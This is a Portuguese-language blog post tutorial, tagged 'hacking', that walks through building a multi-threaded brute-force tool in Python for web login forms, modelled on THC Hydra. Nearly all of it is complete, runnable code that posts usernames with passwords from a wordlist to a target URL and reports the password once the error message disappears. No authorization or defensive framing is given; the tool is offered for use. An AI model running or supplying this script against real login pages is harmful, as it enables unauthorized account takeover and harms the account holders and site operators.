---
layout: post
title:  "Criando nosso próprio script de Brute Force"
date:   2020-10-14 18:00:00 -0300
categories: hacking
author: "ReddyyZ"
lang: pt-BR
tags: [brute force, login page, python, password cracking]
reading_time: 2 minutes
---

Neste artigo vamos aprender como criar um script de Brute Force multi-threadead, semelhante ao THC Hydra.

### Bibliotecas usadas

- requests
- argparse
- threading
- os
- time

Vamos usar a biblioteca [requests](https://requests.readthedocs.io/en/master/) para facilitar o nosso trabalho com as requisições HTTP, [argparse](https://docs.python.org/3/howto/argparse.html) para utilizarmos argumentos na linha de comando e [threading]() para usarmos vários threads que proporcionarão uma maior velocidade.

Caso não queira depender de bibliotecas, pode fazer todas as requisições na mão usando sockets.

### Como irá funcionar o script

O script receberá como argumento o usuário que deve ser testado, uma wordlist com as possíveis senhas e a mensagem de erro que é exibida quando se erra o login.

Ele percorrerá essa lista de senhas testando cada uma, e checando se a mensagem de erro é exibida, caso a mensagem de erro não apareça, a senha foi encontrada!

### Multi-Threading

O multi-threading funcionará da seguinte forma:

> Neste exemplo vamos supor que a quantidade de threads definida é 16

No script terá um `for i in range(16)` que irá obter a primeira senha da lista, remove-la, criar um thread para essa requisição e adicioná-lo a uma lista de threads.

Em seguida ele irá aguardar esses 16 threads terminarem e então repetirá este mesmo código com outras 16 senhas, até achar a senha correta ou terminar a wordlist.

### Criando o script

Agora que já entendemos como o script funcionará, vamos codar!

Primeiro importamos as bibliotecas:
```python
import requests, argparse, threading, os, time
```

---

E agora vamos criar a função que irá enviar a requisição

```python
def send_request(url, data, login, error_message, t_number):
    '''
    error_message = Mensagem de login errado
    data = Formulario preenchido
    login = Usuario e senha
    t_number = Numero do thread
    '''
    print(f"[Thread: {t_number}] Testing: {login[0]}:{login[1]}")
    r = requests.post(url,data=data,timeout=3)

    if not error_message in r.text:
       print(f"\nSENHA ENCONTRADA: {login[0]}:{login[1]}\n")
       os._exit(1)
```

Aqui enviamos a requisição POST e aguardamos a resposta:
```python
r = requests.post(url,data=data,timeout=3)
```
E em seguida checamos se é exibida a mensagem de erro:
```python
if not error_message in r.text:
```
Caso não seja exibida, exibimos a senha encontrada e damos um "exit" no script.
```python
print(f"\nSENHA ENCONTRADA: {login[0]}:{login[1]}\n")
os._exit(1)
```

---

Agora vamos criar a função que irá separar e nos retornar os dados que passarmos (formulários e a mensagem de erro).

```python
def parse_info(data):
    '''
    data = "usuario=^USER^&senha=^PASS^:Username or password invalid"
    '''

    forms, mensagem_de_erro = data.split(":")
    forms = forms.split("&")
    
    user_form = "".join(i.replace("=^USER^","") for i in forms if "^USER^" in i)
    pass_form = "".join(i.replace("=^PASS^","") for i in forms if "^PASS^" in i)

    return (user_form, pass_form, mensagem_de_erro)
```

A função separa a mensagem de erro dos formulários, depois percorre os formulários procurando onde deve-se inserir o usuário e senha, e então retorna os dados.

---

E agora a função que irá receber os argumentos do usuário usando o argparse

```python
def arguments():
    parser = argparse.ArgumentParser("Brute Force",description="https://reddyyz.github.io",usage='python3 bruteforce.py -u http://localhost/login.php -i "user=^USER^&pass=^PASS^:Username or password invalid"')

    parser.add_argument("-u","--url",help="URL do Alvo")
    parser.add_argument("-t","--threads",help="Número de threads",default=16,type=int)
    parser.add_argument("-i","--info",help="Fomularios para atacar e mensagem de erro")

    parser.add_argument("-uL","--user",help="Usuário")

    parser.add_argument("-P","--pass-wordlist",help="Wordlist para senhas")

    args = parser.parse_args()
    if not args.url:
        exit(parser.print_help())

    if not args.user:
        exit(parser.print_help())
    if not args.pass_wordlist:
        exit(parser.print_help())

    return (args.url, args.threads, args.info, args.user, args.pass_wordlist)
```

---

Agora com tudo pronto, vamos criar a função principal:

```python
def main():
    url, threads, info, user, pass_wordlist = arguments()
    user_form, pass_form, mensagem_de_erro = parse_info(info)
    # print("Iniciando...\n")
    print(\
f"""
Alvo: {url}
Threads: {threads}
Mensagem de Erro: {mensagem_de_erro}
Formulários:
    USER -> {user_form}
    PASS -> {pass_form}
""")

    time.sleep(2)

    fd = open(pass_wordlist,"r")
    passwords = fd.read().split("\n") # Lê as senhas
    fd.close()

    while True:
        if not passwords: break # Encerra o script caso as senhas tenham acabado
        threads_ = [None] * threads

        for i in range(threads):
            try:
                passwd = passwords[0]
                passwords.remove(passwd)
            except IndexError:
                break

            login = [user, passwd]
            data = {
                user_form: user,
                pass_form: passwd
            }

            threads_[i] = threading.Thread(target=send_request, args=(url, data, login, mensagem_de_erro, i))
            threads_[i].start()

        for thread in threads_:
            try:
                thread.join()
            except:
                pass

    print("Ataque encerrado!")
```

---

Aqui lemos as senhas, e criamos uma sequência de threads para a função "send_request", aguardamos os threads encerrarem, e repetimos até a senha ser encontrada.

```python
while True:
        if not passwords: break # Encerra o script caso as senhas tenham acabado
        threads_ = [None] * threads

        for i in range(threads):
            try:
                passwd = passwords[0]
                passwords.remove(passwd)
            except IndexError:
                break

            login = [user, passwd]
            data = {
                user_form: user,
                pass_form: passwd
            }

            threads_[i] = threading.Thread(target=send_request, args=(url, data, login, mensagem_de_erro, i))
            threads_[i].start()

        for thread in threads_:
            try:
                thread.join()
            except:
                pass
```

E por fim, colocamos a execução da função main dentro do `if __name__ == "__main__":`

```python
if __name__ == "__main__":
    main()
```

E nosso script está pronto! Demonstração:

VIDEO DO SCRIPT

---

### Obrigado!

Obrigado por ler até aqui! Caso tenha alguma dúvida entre no meu servidor do discord e pergunte!<br>
[Discord Server](https://discord.gg/v5d3PZ9)
<iframe src="https://discordapp.com/widget?id=704882848364101763&theme=dark" width="350" height="500" allowtransparency="true" frameborder="0" sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"></iframe><br>